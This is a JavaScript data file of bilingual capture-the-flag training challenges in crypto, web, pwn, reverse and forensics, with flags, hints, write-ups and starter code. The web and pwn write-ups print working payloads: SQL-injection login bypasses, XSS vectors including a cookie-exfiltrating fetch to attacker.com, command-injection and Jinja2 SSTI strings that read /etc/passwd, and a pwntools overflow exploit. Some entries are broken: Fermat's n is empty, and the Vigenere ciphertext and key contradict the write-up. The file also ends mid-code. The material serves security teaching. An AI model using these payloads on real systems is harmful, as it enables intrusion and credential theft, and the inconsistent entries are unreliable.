const CTF_CHALLENGES = [
  { id: "ctf-001", title: "Baby RSA", titleEn: "Baby RSA", category: "Crypto", difficulty: 2, points: 100, flag: "flag{sm4ll_n_is_e4sy_to_f4ctor}", tags: ["RSA", "因数分解", "入门"], tagsEn: ["RSA", "Factorization", "Beginner"], desc: "小 n 的 RSA。你知道 n=3233，e=17，密文 c=855。直接分解 n 得到 p 和 q，计算 d，解密密文拿到 flag。提示：使用 sympy.factorint() 或 factordb.com。", descEn: "RSA with small n. Given n=3233, e=17, c=855. Factor n to get p, q, compute d, decrypt to get the flag.", hints: ["n 只有 3233，直接分解就能得到 p 和 q", "使用 sympy.factorint(n) 或 factordb.com 在线分解 n 得到 p 和 q", "φ(n)=(p-1)(q-1), d=pow(e,-1,φ(n)), m=pow(c,d,n), 用 long_to_bytes 转换"], hintsEn: ["n is only 3233, factor it directly", "Use sympy.factorint(n) or factordb.com", "Compute phi, d, m=pow(c,d,n), convert with long_to_bytes"], writeup: "Step 1: 分解 n=3233。用 sympy factorint 得到 p=61, q=53。\nStep 2: 计算 φ(n)=(61-1)(53-1)=3120。\nStep 3: 计算 d ≡ e⁻¹ mod φ(n), d=pow(17,-1,3120)=2753。\nStep 4: 解密 m=pow(855,2753,3233)=...，转为字符串得到 flag{sm4ll_n_is_e4sy_to_f4ctor}。\n\n关键代码:\nfrom Crypto.Util.number import *\nfrom sympy import factorint\nn=3233; e=17; c=855\nfactors=factorint(n)\np,q=list(factors.keys())\nphi=(p-1)*(q-1); d=pow(e,-1,phi)\nm=pow(c,d,n)\nprint(long_to_bytes(m).decode())", writeupEn: "Step 1: Factor n=3233 → p=61, q=53. Step 2: phi=3120, d=2753. Step 3: m=pow(855,2753,3233) → flag.", starterCode: "from Crypto.Util.number import long_to_bytes\nfrom sympy import factorint\n\nn = 3233\ne = 17\nc = 855\n\n# Step 1: 分解 n\n# 你的代码...\n\n# Step 2: 计算私钥 d\n# 你的代码...\n\n# Step 3: 解密得到 flag\n# 你的代码...", codeable: true, simulated: false },
  { id: "ctf-002", title: "ROT-What?", titleEn: "ROT-What?", category: "Crypto", difficulty: 1, points: 50, flag: "flag{caesar_is_not_encryption}", tags: ["凯撒密码", "入门", "古典密码"], tagsEn: ["Caesar", "Beginner", "Classical"], desc: "Gur synt vf pnrfne_vf_abg_rapelcgvba. 这是什么？看起来像英文但完全不可读...", descEn: "Gur synt vf pnrfne_vf_abg_rapelcgvba. What is this?", hints: ["密文看起来像英文但每个字母都被替换了", "这是凯撒密码（移位密码），尝试不同的移位量（1-25）", "ROT13 是最常见的变体，每个字母向后移 13 位（A→N, B→O...）"], hintsEn: ["Ciphertext looks like shifted English","Try Caesar cipher with different shifts (1-25)","ROT13 shifts each letter by 13"], writeup: "Step 1: 观察密文 'Gur synt vf pnrfne_vf_abg_rapelcgvba'，看起来像被移位过的英文。\nStep 2: 使用 ROT13 解码（移位 13）：G→T, u→h, r→e... 得到 'The flag is caesar_is_not_encryption'。\nStep 3: 或者遍历所有 25 个移位量，找到可读的明文。\n\n关键代码:\ndef rot(c, k):\n    if 'a'<=c<='z': return chr((ord(c)-97+k)%26+97)\n    if 'A'<=c<='Z': return chr((ord(c)-65+k)%26+65)\n    return c\ndef rot_decode(s, k):\n    return ''.join(rot(c, k) for c in s)\nprint(rot_decode('Gur synt...', 13))", writeupEn: "Apply ROT13: Gur→The, synt→flag → 'The flag is caesar_is_not_encryption'", starterCode: "def rot_decode(ciphertext, shift):\n    \"\"\"用指定移位量解密凯撒密码\"\"\"\n    result = []\n    for c in ciphertext:\n        if 'a' <= c <= 'z':\n            result.append(chr((ord(c) - ord('a') - shift) % 26 + ord('a')))\n        elif 'A' <= c <= 'Z':\n            result.append(chr((ord(c) - ord('A') - shift) % 26 + ord('A')))\n        else:\n            result.append(c)\n    return ''.join(result)\n\ncipher = \"Gur synt vf pnrfne_vf_abg_rapelcgvba\"\n# 试试所有移位量\nfor shift in range(1, 26):\n    plain = rot_decode(cipher, shift)\n    if 'flag' in plain.lower():\n        print(f\"Shift {shift}: {plain}\")", codeable: true, simulated: false },
  { id: "ctf-003", title: "Login Bypass", titleEn: "Login Bypass", category: "Web", difficulty: 2, points: 150, flag: "flag{sql1_1nj3ct1on_m4st3r}", tags: ["SQL注入", "认证绕过"], tagsEn: ["SQLi", "Auth Bypass"], desc: "一个登录页面。管理员用户名为 admin，但你不知道密码。如何在不破解密码的情况下登录？试试经典的 SQL 注入 Payload。", descEn: "A login page with admin user. Bypass authentication using SQL injection.", hints: ["SQL 注入可以绕过认证逻辑，不需要知道密码", "尝试 ' OR '1'='1' 这类万能密码技巧", "用户名填 admin'-- 可以注释掉密码检查部分"], hintsEn: ["SQL injection bypasses auth without password","Try ' OR '1'='1' universal password","Enter admin'-- to comment out password check"], writeup: "Step 1: 后台 SQL 查询可能是: SELECT * FROM users WHERE username='$user' AND password='$pass'。\nStep 2: 在用户名输入: admin'-- 会将密码检查注释掉: SELECT * FROM users WHERE username='admin'--' AND password='...'。\nStep 3: 或者输入 admin'+OR+'1'='1, 使条件永真。\n\nPayload 示例:\n- 用户名: admin'--  密码: 任意\n- 用户名: ' OR 1=1--  密码: 任意\n- 用户名: admin' OR '1'='1  密码: 任意\n\n关键点: -- 是 SQL 注释符，# 也可以。", writeupEn: "Backend SQL: SELECT * FROM users WHERE username='$user' AND password='$pass'. Payloads: admin'--, ' OR 1=1--", codeable: false, simulated: true, termWelcome: "┌──────────────────────────────────────┐\n│  Admin Panel Login - v1.0            │\n│  Target: 192.168.1.100:8080/login    │\n│  Hint: Classic SQL injection ahead   │\n└──────────────────────────────────────┘\nType your payload or 'help' for commands." },
  { id: "ctf-004", title: "XSS Hunter", titleEn: "XSS Hunter", category: "Web", difficulty: 3, points: 200, flag: "flag{xss_r3fl3ct3d_g0t_m3}", tags: ["XSS", "反射型", "Cookie"], tagsEn: ["XSS", "Reflected", "Cookie"], desc: "一个搜索页面将搜索词直接显示在结果页面上，没有做任何过滤。构造一个 XSS Payload 让浏览器弹出 alert(1)。提示：不需要用到 script 标签。", descEn: "A search page reflects input without filtering. Craft XSS to trigger alert(1) without script tags.", hints: ["搜索词被直接回显到页面 HTML 中，没有任何过滤", "试试 <img src=x onerror=alert(1)> 这类不需要 script 标签的 payload", "如果 img 标签被过滤，试试 <svg onload=alert(1)> 或 <body onload=alert(1)>"], hintsEn: ["Input is reflected in HTML unfiltered","Try <img src=x onerror=alert(1)>","Also: <svg onload=alert(1)>, <body onload=alert(1)>"], writeup: "Step 1: 页面将搜索参数直接回显到结果中，无任何过滤。\nStep 2: 构造 XSS Payload 避免 <script> 标签（可能被过滤）。\nStep 3: 使用 <img src=x onerror=alert(1)>，当图片加载失败时触发 onerror 事件。\n\n备用 Payload:\n- <svg onload=alert(1)>\n- <body onload=alert(1)>\n- <input autofocus onfocus=alert(1)>\n- <details open ontoggle=alert(1)>\n\n若需要窃取 Cookie: <img src=x onerror=\"fetch('http://attacker.com/?c='+document.cookie)\">", writeupEn: "Use <img src=x onerror=alert(1)> or alternatives. No <script> tag needed.", codeable: false, simulated: true, termWelcome: "┌──────────────────────────────────────┐\n│  Search Engine v0.1-beta             │\n│  No CSP. No filtering. Pure 90s web. │\n│  Endpoint: /search?q=               │\n└──────────────────────────────────────┘\nEnter your XSS payload:" },
  { id: "ctf-005", title: "Where's The Flag?", titleEn: "Where's The Flag?", category: "Misc", difficulty: 1, points: 25, flag: "flag{h1dd3n_1n_pl41n_s1ght}", tags: ["HTML", "隐写"], tagsEn: ["HTML", "Steganography"], desc: "一个看起来普通的网页。Flag 就在页面上——但你需要找到它藏在哪里。", descEn: "A normal-looking webpage. The flag is hidden somewhere on the page.", hints: ["flag 藏在网页的代码中，而不是肉眼可见的页面内容里", "试试在浏览器中按 F12 打开开发者工具或 Ctrl+U 查看源代码", "搜索 'flag{' 或 '<!--' 找到 HTML 注释中的隐藏内容"], hintsEn: ["Flag is in source code, not visible content","F12 DevTools or Ctrl+U to view source","Search for 'flag{' or '<!--' in HTML comments"], writeup: "Step 1: 页面看起来正常，但 flag 不在可见文本中。\nStep 2: 右键 → 查看页面源代码 (Ctrl+U) 或 F12 开发者工具。\nStep 3: 在源代码中搜索 'flag{' 或在底部找到被注释掉的 flag。\n\n常用技巧:\n- Ctrl+U 查看完整 HTML 源码\n- F12 → Elements 面板搜索\n- 检查 HTML 注释 <!-- -->\n- 检查 CSS 中的 content 属性\n- 检查 JS 控制台是否有 log 输出", writeupEn: "View source (Ctrl+U), search for 'flag{' or HTML comments. Check DevTools, CSS content, console logs.", codeable: false, simulated: false },
  { id: "ctf-006", title: "Pcap Analysis", titleEn: "Pcap Analysis", category: "Forensics", difficulty: 2, points: 150, flag: "flag{p4ck3t_wh1sp3r3r}", tags: ["Wireshark", "流量分析"], tagsEn: ["Wireshark", "Traffic Analysis"], desc: "给你一个 pcap 文件。其中记录了一次 HTTP 通信，flag 在通信的某个位置。用 Wireshark 分析并找到它。", descEn: "Analyze a pcap file with HTTP traffic. Find the flag hidden in the communication.", hints: ["用 Wireshark 打开 pcap 文件，先看总体协议分布", "Follow TCP Stream 或 Follow HTTP Stream 查看完整的 HTTP 请求和响应", "在 HTTP 响应正文中搜索 'flag{' 关键字"], hintsEn: ["Open in Wireshark, check protocol distribution","Follow TCP/HTTP Stream for full requests","Search 'flag{' in response bodies"], writeup: "Step 1: 用 Wireshark 打开 pcap 文件。\nStep 2: 应用过滤器 http 只显示 HTTP 流量。\nStep 3: 右键 HTTP 数据包 → Follow → HTTP Stream，查看完整的请求/响应。\nStep 4: 在响应正文中搜索 flag，或以字符串方式导出对象。\n\nWireshark 快捷键:\n- Ctrl+F 打开搜索，搜索 'flag' 字符串\n- File → Export Objects → HTTP 导出所有 HTTP 传输文件\n- tshark -r capture.pcap -Y http -T fields -e http.response", writeupEn: "Filter http in Wireshark, Follow HTTP Stream, search for 'flag'. Export: File→Export Objects→HTTP.", codeable: false, simulated: false },
  { id: "ctf-007", title: "Fermat's Gift", titleEn: "Fermat's Gift", category: "Crypto", difficulty: 3, points: 250, flag: "flag{f3rm4t_w0uld_b3_pr0ud}", tags: ["RSA", "费马分解"], tagsEn: ["RSA", "Fermat Factorization"], desc: "n = 。e=65537，c=密文。用费马分解恢复 p 和 q。", descEn: "Large n with close p,q. Use Fermat factorization to recover factors.", hints: ["p 和 q 非常接近时，可以用费马分解法", "从 sqrt(n) 开始搜索整数 a，检查 a² - n 是否为完全平方数", "用 gmpy2.iroot() 检查是否为完全平方数: a = ceil(sqrt(n)), 检查 (a² - n) 是否为平方数"], hintsEn: ["p and q are close — Fermat works","Start from sqrt(n), check a²-n for perfect squares","Use gmpy2.iroot() for square checking"], writeup: "Step 1: 费马分解的原理：若 n = p·q 且 p≈q，则可表为 n = a² - b² = (a+b)(a-b)。\nStep 2: 从 a = ceil(sqrt(n)) 开始，检查 b² = a² - n 是否为完全平方数。\nStep 3: 找到 a,b 后，p = a+b, q = a-b。\nStep 4: 标准 RSA 解密流程：φ(n), d, m。\n\n关键代码:\nimport gmpy2\nfrom Crypto.Util.number import *\na = gmpy2.isqrt(n) + 1\nwhile True:\n    b2 = a*a - n\n    if gmpy2.is_square(b2):\n        b = gmpy2.isqrt(b2)\n        p, q = a+b, a-b\n        break\n    a += 1\nphi = (p-1)*(q-1)\nd = pow(e, -1, phi)\nm = pow(c, d, n)", writeupEn: "Fermat: n=a²-b²=(a+b)(a-b). Start a=ceil(sqrt(n)), find b²=a²-n as perfect square.", starterCode: "import gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\nn = \ne = 65537\n\n# 密文（从题目获取）\nc = 0  # TODO: 填入密文\n\n# Step 1: 费马分解\n# 从 sqrt(n) 向上搜索\n# 你的代码...\n\n# Step 2: 找到 p, q 后计算私钥 d 并解密\n# 你的代码...", codeable: true, simulated: false },
  { id: "ctf-008", title: "Command Injection 101", titleEn: "Command Injection 101", category: "Web", difficulty: 2, points: 100, flag: "flag{c0mm4nd_1nj3ct10n_3z}", tags: ["命令注入"], tagsEn: ["Command Injection"], desc: "一个 ping 工具允许输入 IP 地址。但你发现输入的不是纯 IP 时，系统也执行了额外的命令...", descEn: "A ping tool that executes extra commands when input is not a pure IP.", hints: ["系统直接把你输入的内容拼接到 shell 命令中执行了", "试试用 ; | && || 等 shell 分隔符附加额外命令", "输入 127.0.0.1; cat flag.txt 或 127.0.0.1 && ls -la"], hintsEn: ["Input concatenated into shell command","Try ; | && || shell separators","127.0.0.1; cat flag.txt"], writeup: "Step 1: 后台命令可能是 os.system('ping -c 4 ' + user_input)。\nStep 2: 输入不是纯 IP 时，使用 shell 分隔符注入额外命令。\nStep 3: 常用分隔符：; (顺序执行), | (管道), && (前成功则后执行), || (前失败则后执行), `` (命令替换), $() (命令替换)。\n\nPayload 示例:\n- 127.0.0.1; cat flag.txt\n- 127.0.0.1 && ls -la\n- 127.0.0.1 | cat /etc/passwd\n- $(cat flag.txt)\n- `cat flag.txt`\n\n如果空格被过滤:\n- 127.0.0.1;cat${IFS}flag.txt\n- 127.0.0.1;cat<flag.txt", writeupEn: "Shell separators: ;, |, &&, ||. If spaces filtered: ${IFS} or < redirection.", codeable: false, simulated: true, termWelcome: "┌──────────────────────────────────────┐\n│  Network Diagnostic Tool v2.1        │\n│  Ping any host from our server       │\n│  shell_exec('ping -c 4 ' . \$input)  │\n└──────────────────────────────────────┘\nEnter target IP or hostname:" },
  { id: "ctf-009", title: "Base64 × N", titleEn: "Base64 × N", category: "Misc", difficulty: 1, points: 50, flag: "flag{you_f0und_th3_l4y3rs}", tags: ["Base64", "编码"], tagsEn: ["Base64", "Encoding"], desc: "", descEn: "Multi-layer Base64 encoded string. Decode repeatedly to find the flag.", hints: ["这段长字符串看起来像 Base64 编码", "解码一次后结果看起来还是 Base64，需要多次解码", "写个循环反复 base64 解码，直到出现 flag{ 为止"], hintsEn: ["String looks like Base64","Decoded result is still Base64","Loop decode until 'flag{' appears"], writeup: "Step 1: 观察密文，只含 A-Za-z0-9+/=，判断为 Base64。\nStep 2: base64 解码一次后，结果仍然看起来像 Base64。\nStep 3: 写循环反复解码，每次检查是否包含 'flag{'。\n\n关键代码:\nimport base64\nenc = 'Vm0wd2QyUXl...'\nfor _ in range(10):\n    enc = base64.b64decode(enc).decode()\n    if 'flag' in enc:\n        print(enc)\n        break\n\n答案在解码 6 次后出现。这种多层 Base64 编码是 CTF Misc 题的常见套路。", writeupEn: "Loop base64 decode until 'flag{' found. Answer at 6th round. Multi-layer Base64 is common CTF pattern.", codeable: false, simulated: false },
  { id: "ctf-010", title: "ELF Beginner", titleEn: "ELF Beginner", category: "Reverse", difficulty: 2, points: 150, flag: "flag{str1ngs_1s_y0ur_fr13nd}", tags: ["逆向", "ELF", "入门"], tagsEn: ["Reverse", "ELF", "Beginner"], desc: "一个 Linux 可执行文件，运行后提示输入密码。如果你的密码正确，程序会输出 flag。尝试在不运行程序的情况下找到密码。", descEn: "Linux binary that checks a password. Find it without running.", hints: ["不需要运行程序，先从静态分析开始", "使用 strings 命令提取二进制中的可读字符串", "用 grep 在 strings 输出中搜索 flag 或 password 关键词"], hintsEn: ["Static analysis first","strings command extracts readable strings","grep for 'flag' or 'password'"], writeup: "Step 1: 无需执行程序，静态分析即可。\nStep 2: 运行 strings elf_file，提取所有可打印字符串。\nStep 3: strings elf_file | grep -i flag 找到硬编码的 flag。\n\n进阶方法:\n- file elf_file 确认文件类型\n- readelf -h elf_file 查看 ELF 头\n- objdump -d elf_file 反汇编\n- ltrace ./elf_file 跟踪库函数调用\n- strace ./elf_file 跟踪系统调用\n- Ghidra / IDA 打开做完整逆向分析", writeupEn: "strings elf | grep flag. Advanced: file, readelf, objdump, ltrace, strace, Ghidra.", codeable: false, simulated: false },
  { id: "ctf-011", title: "Broadcast Attack", titleEn: "Broadcast Attack", category: "Crypto", difficulty: 3, points: 250, flag: "flag{h4st4d_br0adc4st_4tt4ck}", tags: ["RSA", "Håstad广播攻击", "CRT"], tagsEn: ["RSA", "Håstad Broadcast", "CRT"], desc: "你截获了三条密文：c1、c2、c3，它们都是用 e=3 的公钥加密同一明文 m，但模数 n1、n2、n3 各不相同且两两互质。不需要私钥，你能恢复 m 吗？提示：中国剩余定理。", descEn: "Same message encrypted with e=3 under three different moduli. Use CRT to recover plaintext.", hints: ["同一消息 m 用相同的 e=3 加密三次，三组 (n1,c1), (n2,c2), (n3,c3)", "中国剩余定理 (CRT) 可以合并三个同余式得到 m³ mod (n1·n2·n3)", "对合并后的值开立方根即可得到 m: m³ = C mod N, m = gmpy2.iroot(C, 3)"], hintsEn: ["Same m, e=3, three (n,c) pairs","CRT merges congruences to get m³","Take cube root: gmpy2.iroot(C, 3)"], writeup: "Step 1: Håstad 广播攻击，利用同余方程组 m³ ≡ cᵢ (mod nᵢ)。\nStep 2: 用 CRT 合并: 求 C 使得 C ≡ cᵢ (mod nᵢ) 且 C ≡ m³ (mod n₁n₂n₃)。\nStep 3: 由于 m³ < n₁n₂n₃, 直接开立方根即可恢复 m。\n\n关键代码:\nfrom sympy.ntheory.modular import crt\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\nn_list = [n1, n2, n3]\nc_list = [c1, c2, c3]\nresult = crt(n_list, c_list)\nm_cubed = result[0]  # m^3\nm = gmpy2.iroot(m_cubed, 3)[0]\nprint(long_to_bytes(m).decode())", writeupEn: "Håstad broadcast: CRT to find C=m³ mod(N), then cube root since m³<N.", starterCode: "import gmpy2\nfrom sympy.ntheory.modular import crt\nfrom Crypto.Util.number import long_to_bytes\n\n# 三组公钥 (n, e=3) 和密文\nn1 = 0  # TODO\nn2 = 0\nn3 = 0\nc1 = 0\nc2 = 0\nc3 = 0\n\n# Step 1: 用 CRT 合并三个同余式\n# 你的代码...\n\n# Step 2: 开立方根\n# 你的代码...\n\n# Step 3: 转换为 flag\n# 你的代码...", codeable: true, simulated: false },
  { id: "ctf-012", title: "SSTI Detective", titleEn: "SSTI Detective", category: "Web", difficulty: 3, points: 200, flag: "flag{j1nj4_2_t3mpl4t3_1nj3ct10n}", tags: ["SSTI", "Flask", "Jinja2"], tagsEn: ["SSTI", "Flask", "Jinja2"], desc: "一个 Flask 网站输入姓名后返回 'Hello {name}'。但你怀疑它把输入直接放进了模板渲染。尝试利用 SSTI 读取 /etc/passwd 文件内容。", descEn: "Flask app renders input in template. Exploit SSTI to read /etc/passwd.", hints: ["输入 {{7*7}} 如果返回 49 说明存在 SSTI", "Jinja2 中可以通过对象链访问 Python 内置函数", "使用 {{ ''.__class__.__mro__[1].__subclasses__() }} 遍历类链找到 os.popen"], hintsEn: ["{{7*7}} returns 49 confirms SSTI","Traverse Python object chain via Jinja2","Find os.popen in subclass chain"], writeup: "Step 1: 确认 SSTI: 输入 {{7*7}}，若返回 49 而非常规文本，则存在 SSTI。\nStep 2: 利用 Jinja2 对象链获取 Python 内置函数。\nStep 3: 构造 payload 读取文件。\n\n经典 Payload:\n{{ config.items() }}  — 读取 Flask 配置\n{{ ''.__class__.__mro__[1].__subclasses__() }}  — 列出所有子类\n\n寻找 subprocess.Popen:\n{{ ''.__class__.__mro__[2].__subclasses__()[X]('cat /etc/passwd', shell=True, stdout=-1).communicate()[0] }}\n\n简化版 (如果可用):\n{{ lipsum|attr('__globals__')['os']['popen']('cat /etc/passwd')|attr('read')() }}", writeupEn: "{{7*7}}→49 confirms SSTI. Payload: {{''.__class__.__mro__[X]('cat /etc/passwd',...).communicate()[0]}}", codeable: false, simulated: true, termWelcome: "┌──────────────────────────────────────┐\n│  Flask Guest Book v0.3 - Jinja2      │\n│  render_template_string('Hello ' + n) │\n│  /greet?name=<your input>            │\n└──────────────────────────────────────┘\nEnter your name:" },
  { id: "ctf-013", title: "Stack Overflow 101", titleEn: "Stack Overflow 101", category: "PWN", difficulty: 3, points: 200, flag: "flag{r3t_2_w1n_1s_ez}", tags: ["PWN", "栈溢出", "ret2win"], tagsEn: ["PWN", "Buffer Overflow", "ret2win"], desc: "给你一个 ELF 文件 vuln。运行后接收输入然后退出。但是反汇编会发现一个从未被调用的 win() 函数——调用它就能拿到 flag。构造 Payload 覆盖返回地址跳转到 win()。", descEn: "ELF with unused win() function. Overflow buffer to redirect to win().", hints: ["用 checksec 检查保护措施（可能 NX 开启但 PIE 关闭）", "用 objdump -d 或 readelf -s 找 win() 函数的地址", "用 pwntools cyclic 和 pattern_offset 找到覆盖返回地址需要的偏移量"], hintsEn: ["checksec for protections","objdump -d to find win() address","pwntools cyclic/pattern_offset for offset"], writeup: "Step 1: checksec vuln 查看保护。若无 PIE，win() 地址固定。\nStep 2: objdump -d vuln | grep win 找到 win() 地址 (例如 0x401156)。\nStep 3: 用 pwntools 确定偏移量。\n\n关键代码:\nfrom pwn import *\nelf = ELF('./vuln')\nwin_addr = elf.symbols['win']  # 或 0x401156\noffset = 72  # cyclic pattern_offset 得到\npayload = b'A' * offset + p64(win_addr)\np = process('./vuln'); p.sendline(payload); p.interactive()\n\n如果 64 位程序，注意栈对齐: payload = b'A'*offset + p64(ret_gadget) + p64(win_addr)", writeupEn: "payload = b'A'*offset + p64(win_addr). 64-bit: add ret gadget for alignment.", codeable: false, simulated: false },
  { id: "ctf-014", title: "XOR Madness", titleEn: "XOR Madness", category: "Reverse", difficulty: 3, points: 200, flag: "flag{x0r_1s_n0t_encrypti0n}", tags: ["逆向", "XOR", "Ghidra"], tagsEn: ["Reverse", "XOR", "Ghidra"], desc: "给你的文件包含一个 flag.enc 和 encrypt 程序。flag.enc 是加密后的 flag，encrypt 是加密程序本身。分析 encrypt 的加密逻辑并恢复出原始 flag。", descEn: "Encrypted file + encrypt program. Analyze encryption logic to recover flag.", hints: ["用 Ghidra 或 IDA 打开 encrypt 分析加密函数", "加密可能是简单的逐字节 XOR 操作", "如果加密是 XOR with 0x55 再 XOR with 0xAA，那么解密也是同样的操作（XOR 是可逆的）"], hintsEn: ["Ghidra/IDA for encryption function","Simple per-byte XOR likely","XOR is self-inverse: encrypt again to decrypt"], writeup: "Step 1: 用 Ghidra 打开 encrypt，定位 main 或加密函数。\nStep 2: 发现加密逻辑: for i in range(len): buf[i] ^= 0x55; buf[i] ^= 0xAA;\nStep 3: 等价于 buf[i] ^= (0x55 ^ 0xAA) = 0xFF，即逐字节取反。\nStep 4: 对 flag.enc 的每个字节再次 XOR 0xFF 即可恢复原文。\n\n关键代码:\nwith open('flag.enc', 'rb') as f:\n    enc = f.read()\ndec = bytes([b ^ 0xFF for b in enc])\nprint(dec.decode())\n\n注意: 如果 XOR key 不止一个字节（多字节循环 XOR），需要根据 key 长度循环异或。", writeupEn: "buf[i]^=0x55; buf[i]^=0xAA = buf[i]^=0xFF. Decrypt: XOR each byte with 0xFF.", codeable: false, simulated: false },
  { id: "ctf-015", title: "Memory Dump Analysis", titleEn: "Memory Dump Analysis", category: "Forensics", difficulty: 3, points: 250, flag: "flag{v0l4t1l1ty_m3m0ry_f0r3ns1cs}", tags: ["内存取证", "Volatility", "Windows"], tagsEn: ["Memory Forensics", "Volatility", "Windows"], desc: "给你一个 Windows 10 的内存镜像 memory.dmp。系统管理员在被入侵后立刻做了内存转储。使用 Volatility 分析：进程列表、命令行历史、网络连接——然后找到攻击者留下的 flag。", descEn: "A Windows 10 memory dump. The admin captured it right after a breach. Use Volatility to analyze processes, command history, and network connections to find the attacker's flag.", hints: ["使用 Volatility 3 框架分析内存镜像", "先运行 windows.info 确定 Windows 版本，然后查进程列表和命令行", "用 windows.cmdline 或 windows.consoles 查看攻击者执行的命令"], hintsEn: ["Use Volatility 3 framework for memory analysis","Run windows.info first, then check process list and command lines","Use windows.cmdline or windows.consoles to find attacker commands"], writeup: "Step 1: python3 vol.py -f memory.dmp windows.info 确定镜像信息。\nStep 2: python3 vol.py -f memory.dmp windows.pslist 查看进程列表。\nStep 3: python3 vol.py -f memory.dmp windows.cmdline 查看命令行历史，找到 echo 'flag{...}' > note.txt。\nStep 4: python3 vol.py -f memory.dmp windows.filescan | grep note.txt 定位文件。\nStep 5: python3 vol.py -f memory.dmp windows.dumpfiles --virtaddr 0x... 导出文件。\n\n关键命令清单:\n- windows.info / windows.pslist / windows.psscan\n- windows.cmdline / windows.consoles\n- windows.netstat / windows.netscan\n- windows.filescan / windows.dumpfiles\n- windows.malfind (检测恶意代码注入)", writeupEn: "Volatility workflow: windows.info→pslist→cmdline→filescan→dumpfiles. Find attacker's echo command with the flag.", codeable: false, simulated: false },
  { id: "ctf-016", title: "PHP Type Juggling", titleEn: "PHP Type Juggling", category: "Web", difficulty: 2, points: 150, flag: "flag{php_l00s3_c0mp4r1s0n}", tags: ["PHP", "类型混淆", "弱类型"], tagsEn: ["PHP", "Type Juggling", "Loose Comparison"], desc: "网站登录验证的 PHP 代码：if (md5($input) == $stored_hash) { grant_access(); }。你知道存储的哈希是 0e123456789012345678901234567890。利用 PHP 的弱类型比较（==）绕过身份验证。不需要知道原始密码。", descEn: "Login uses PHP loose comparison: if (md5($input) == $stored_hash). The stored hash is 0e123456789012345678901234567890. Exploit PHP type juggling to bypass auth.", hints: ["PHP 的 == 是弱类型比较，会自动做类型转换", "\"0e12345...\" 被解析为科学计数法 0×10¹²³⁴⁵ = 0", "找一个 MD5 值也是 0e 开头后面全是数字的字符串作为密码"], hintsEn: ["PHP == does loose comparison with auto type coercion","\"0e12345...\" parses as scientific notation 0×10^n = 0","Find a string whose MD5 is also 0e-prefixed with all digits"], writeup: "Step 1: 问题在 if (md5($input) == $stored_hash)。PHP == 做弱类型比较。\nStep 2: '0e123456789012345678901234567890' 被 PHP 解析为 0e123... = 0（科学计数法）。\nStep 3: 找一个 MD5 哈希也为 0e 开头 + 全数字的字符串，如 '240610708'。\nStep 4: if (0 == 0) 为真，绕过成功。\n\n已知的 Magic Hash 值 (md5 为 0e开头):\n- 240610708 → 0e462097431906509019562988736854\n- QNKCDZO → 0e830400451993494058024219903391\n- aabg7XSs → 0e087386482136013740957780965295\n- s878926199a → 0e545993274517709034328855841020\n\n安全建议: 使用 === 严格比较, 或用 hash_equals() 或 password_verify()。", writeupEn: "PHP '0e' magic hashes: 240610708, QNKCDZO. Both MD5 to 0e...=0 in loose comparison. Use === instead.", codeable: false, simulated: true, termWelcome: "┌──────────────────────────────────────┐\n│  PHP Admin Panel - Legacy v1.0       │\n│  if (md5(\$input) == \$stored_hash)  │\n│  stored_hash: 0e12345678901234...    │\n└──────────────────────────────────────┘\nEnter password:" },
  { id: "ctf-017", title: "Vigenere Cipher", titleEn: "Vigenere Cipher", category: "Crypto", difficulty: 3, points: 200, flag: "flag{v1gen3re_1s_br0k3n_w1th_k4s1sk1}", tags: ["Vigenere", "古典密码", "频率分析"], tagsEn: ["Vigenere", "Classical", "Frequency Analysis"], descEn: "A famous historical message encrypted with Vigenere cipher. Use Kasiski test and frequency analysis to break it.", hintsEn: ["Ciphertext has periodic patterns suggesting polyalphabetic cipher","Kasiski test finds key length from repeated sequence distances","Split into groups by key length, frequency analysis on each (each is Caesar)"], writeupEn: "Kasiski test finds key length. Split ciphertext into N groups, each is a Caesar cipher. Use frequency analysis. Tools: dcode.fr or CyberChef.", desc: "密文: Rla xfju esj ztzy gj fw Hzzyfzj bfiv frjs ymj gjxyzxnsl kzsynsl? Ymj htsyjxy bfx f Hfjyfs fsi ymj Vnsl rjtyjw qjaqjwx ymj Vnhjw... Frfgnsl, ymj Vnsl gjlfxy ymj nsyznyj fsi gjxyb ymj htzsytk gjub. Ymj htyyflj xytti gnym ymj xujhtrjsi dfts ymj bfqqtkwj bmjwjsymj kbfqhts pzhhji nshjsybt. Rfyymj htqnsy qzxsj ymj ljxzqy, ymj htzwd hfx, ymj bfsi bmj wjfhmji Rfyymj.'", hints: ["密文有明显的周期性模式，这暗示了多表替换密码", "用 Kasiski 测试找到重复序列的距离，它们的公约数就是密钥长度", "确定密钥长度后，把密文分成 N 组，每组用频率分析破解（每组本质上是一个凯撒密码）"], writeup: "Step 1: 观察密文，注意到 'ymj' 反复出现，这是 Vigenere 密码的特征。\nStep 2: Kasiski 测试：找到重复序列 'ymj' 出现位置的距离，求 GCD 得密钥长度。\nStep 3: 密钥长度为 3，将密文分成 3 组（第 0,3,6... 位、第 1,4,7... 位、第 2,5,8... 位），每组都是凯撒密码。\nStep 4: 对每组做频率分析，找最常出现的字母 = 'e'，确定每组移位量。\n\n关键代码 (使用在线工具更快捷):\nfrom collections import Counter\n# 假设已知 key=\":)\", shift 分别为对应字母\n# 逐位解密即可\n\nCTF 中推荐使用 dcode.fr/vigenere-cipher 或 CyberChef 的 Vigenere Decode 功能。", starterCode: "def find_key_length(ciphertext, max_len=20):\n    \"\"\"Kasiski 测试找密钥长度\"\"\"\n    from collections import defaultdict\n    from math import gcd\n    # 找重复子串及其距离\n    repeats = defaultdict(list)\n    for length in range(3, 6):\n        for i in range(len(ciphertext) - length):\n            substr = ciphertext[i:i+length]\n            repeats[substr].append(i)\n    distances = []\n    for substr, positions in repeats.items():\n        if len(positions) > 1:\n            for j in range(1, len(positions)):\n                distances.append(positions[j] - positions[j-1])\n    if distances:\n        g = distances[0]\n        for d in distances[1:]:\n            g = gcd(g, d)\n        return g\n    return 1\n\ndef vigenere_decrypt(ciphertext, key):\n    \"\"\"用密钥解密 Vigenere 密码\"\"\"\n    plain = []\n    key_len = len(key)\n    for i, c in enumerate(ciphertext):\n        if c.isalpha():\n            base = ord('a') if c.islower() else ord('A')\n            shift = ord(key[i % key_len].lower()) - ord('a')\n            plain.append(chr((ord(c) - base - shift) % 26 + base))\n        else:\n            plain.append(c)\n    return ''.join(plain)\n\ncipher = \"Rla xfju esj ztzy gj fw Hzzyfzj bfiv frjs ymj gjxyzxnsl kzsynsl?...\"\n\n# Step 1: 找密钥长度\nkey_len = 